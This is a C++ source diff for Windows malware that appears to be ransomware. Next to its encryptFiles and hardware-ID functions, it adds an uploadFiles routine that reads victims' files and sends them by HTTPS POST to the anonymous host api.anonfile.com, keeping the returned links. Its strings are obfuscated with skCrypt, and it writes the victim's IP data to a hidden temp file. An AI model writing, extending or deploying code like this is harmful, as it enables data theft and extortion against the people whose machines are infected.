@@ -3,6 +3,7 @@
 using namespace std;
 using Json = nlohmann::json;
 
+vector<string> filesLink;
 vector<string> globalAllFiles;
 mutex allFilesMutex;
 
@@ -212,7 +213,7 @@ string getHWID() {
 }
 
 string getIPData() {
-    string json, result;
+    string result;
     URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
     SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
     ifstream file((TEMPFILE));
@@ -477,6 +478,76 @@ void encryptFiles(vector<string> files, string key) {
         fout.write((const char*)&content[0], content.size());
         fout.close();
     }
+}
+
+void uploadFiles(vector<string> files) {
+    for (string file : files) {
+        string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
+        string str_header = (string)skCrypt("Content-Type: multipart/form-data; boundary=----") + boundary;
+        string str_open = (string)skCrypt("------") + boundary + (string)skCrypt("\nContent-Disposition: form-data; name=\"file\"; filename=\"") + split(file, '\\').back() + (string)skCrypt("\"\nContent-Type: application/octet-stream\n\n");
+        string str_close = (string)skCrypt("\n------") + boundary + (string)skCrypt("--\n");
+        string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
+
+        FILE* fp = NULL;
+        fopen_s(&fp, file.c_str(), skCrypt("rb"));
+        if (!fp)
+            continue;
+
+        fseek(fp, 0, SEEK_END);
+        long filesize = ftell(fp);
+        rewind(fp);
+        int datalen = filesize + str_open.length() + str_close.length();
+        char* data = (char*)malloc(datalen);
+
+        strcpy_s(data, datalen, str_open.c_str());
+        fread(data + str_open.length(), 1, filesize, fp);
+        memcpy(data + str_open.length() + filesize, str_close.c_str(), str_close.length());
+
+        HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;
+
+        hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        if (!hsession)
+            goto cleanup;
+
+        hconnect = InternetConnectA(hsession, skCrypt("api.anonfile.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!hconnect)
+            goto cleanup;
+
+        hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), skCrypt("/upload"), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+        if (!hrequest)
+            goto cleanup;
+
+        if (!HttpSendRequestA(hrequest, str_header.c_str(), (DWORD)-1, data, datalen))
+            goto cleanup;
+
+        DWORD received;
+        BYTE buf[1024];
+        while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
+            buf[received] = 0;
+            char str[sizeof(buf) + 1];
+            memcpy(str, buf, sizeof(buf));
+            str[sizeof(buf)] = 0;
+            Json data = Json::parse(str);
+            if (data[(string)skCrypt("status")])
+                filesLink.push_back((string)data[(string)skCrypt("data")][(string)skCrypt("file")][(string)skCrypt("url")][(string)skCrypt("full")]);
+            else
+                filesLink.push_back((string)skCrypt("none"));
+        }
+
+
+    cleanup:
+        fclose(fp);
+        if (hsession)
+            InternetCloseHandle(hsession);
+        if (hconnect)
+            InternetCloseHandle(hconnect);
+        if (hrequest)
+            InternetCloseHandle(hrequest);
+    }
+}
+
+vector<string> getLinks() {
+    return filesLink;
 }
 
 void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
